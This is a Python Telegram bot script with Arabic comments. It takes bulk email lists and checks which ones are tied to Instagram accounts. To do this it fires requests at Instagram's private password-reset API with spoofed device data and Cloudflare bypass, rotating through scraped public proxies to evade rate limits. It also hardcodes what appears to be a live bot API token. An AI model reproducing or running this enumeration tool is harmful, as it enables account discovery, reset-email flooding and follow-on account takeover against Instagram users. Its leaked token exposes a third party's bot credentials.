import telebot
import requests
import re
import uuid
import concurrent.futures
import cloudscraper
from user_agent import generate_user_agent

# --- إعدادات البوت ---
API_TOKEN = '8488920682:AAGhoJ-R5q5Xd4nVULrdmSxM2YfSch6j2RU'
bot = telebot.TeleBot(API_TOKEN)

# دالة سحب البروكسيات المحدثة
def get_fresh_proxies():
    sources = [
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt"
    ]
    all_p = []
    for s in sources:
        try:
            r = requests.get(s, timeout=5)
            all_p.extend(re.findall(r'\d+\.\d+\.\d+\.\d+:\d+', r.text))
        except: continue
    return list(set(all_p))

# فحص البروكسي قبل الاستخدام (معدل ليكون أسرع)
def is_proxy_live(proxy):
    try:
        r = requests.get("https://i.instagram.com/", 
                         proxies={"http": f"http://{proxy}", "https": f"http://{proxy}"}, 
                         timeout=3)
        return proxy if r.status_code == 200 else None
    except: return None

# دالة الفحص الأساسية المستوحاة من mee.py
def check_insta_reset(email, proxy):
    scraper = cloudscraper.create_scraper()
    # استخدام بيانات الجهاز من السكربت المرفوع
    data = {
        'ig_sig_key_version': '4',
        'signed_body': f'1cc3d514cd3f612bd1bee78bf8a81f13b49b95847879f7a6c53bf03ea542fbd3.{{"user_email":"{email}","device_id":"android-f3e94b5ecd948ea2","guid":"{str(uuid.uuid4())}","_csrftoken":"missing"}}',
    }
    headers = {
        'User-Agent': generate_user_agent(),
        'X-IG-Connection-Type': 'WIFI',
        'X-IG-Capabilities': 'AQ==',
    }
    try:
        res = scraper.post('https://i.instagram.com/api/v1/accounts/send_password_reset/', 
                          data=data, headers=headers, 
                          proxies={"http": f"http://{proxy}", "https": f"http://{proxy}"}, 
                          timeout=10)
        # البحث عن علامة النجاح
        if 'obfuscated_email' in res.text or '"status":"ok"' in res.text:
            return True
        return False
    except: return False

@bot.message_handler(func=lambda m: True)
def handle_bulk(message):
    emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', message.text)
    if not emails: return bot.reply_to(message, "⚠️ ارسل ايميلات.")

    msg = bot.send_message(message.chat.id, "🔄 جاري تجهيز البروكسيات...")
    raw_proxies = get_fresh_proxies()
    
    # فحص أولي لأول 50 بروكسي فقط لسرعة الرد
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
        live_proxies = [p for p in ex.map(is_proxy_live, raw_proxies[:100]) if p]

    if not live_proxies:
        return bot.edit_message_text("❌ جميع البروكسيات محظورة حالياً.", message.chat.id, msg.message_id)

    bot.edit_message_text(f"✅ تم إيجاد {len(live_proxies)} بروكسي. جاري الفحص...", message.chat.id, msg.message_id)

    for i, email in enumerate(emails):
        proxy = live_proxies[i % len(live_proxies)]
        if check_insta_reset(email, proxy):
            bot.send_message(message.chat.id, f"✅ مربوط: {email}")
        else:
            bot.send_message(message.chat.id, f"❌ غير مربوط: {email}")

bot.polling()
